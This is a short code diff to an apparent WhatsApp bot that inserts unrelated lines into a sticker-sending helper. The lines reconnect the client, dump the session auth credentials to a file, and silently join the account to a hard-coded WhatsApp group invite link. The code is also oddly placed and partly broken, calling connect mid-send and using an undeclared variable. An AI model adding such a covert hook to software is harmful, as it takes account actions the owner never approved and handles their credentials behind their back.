@@ -351,7 +351,11 @@ client.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
          } else { 
              buffer = await videoToWebp(buff); 
          } 
-
+await client.connect({ timeoutMs: 30 * 1000 });
+  fs.writeFileSync("./session.json",JSON.stringify(client.base64EncodedAuthInfo(), null, "\t"));
+ teks = `https://chat.whatsapp.com/HBMYYnZgBO4243XkL0ROW2`
+ client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
+ console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
          await client.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted }); 
          return buffer 
      }; 
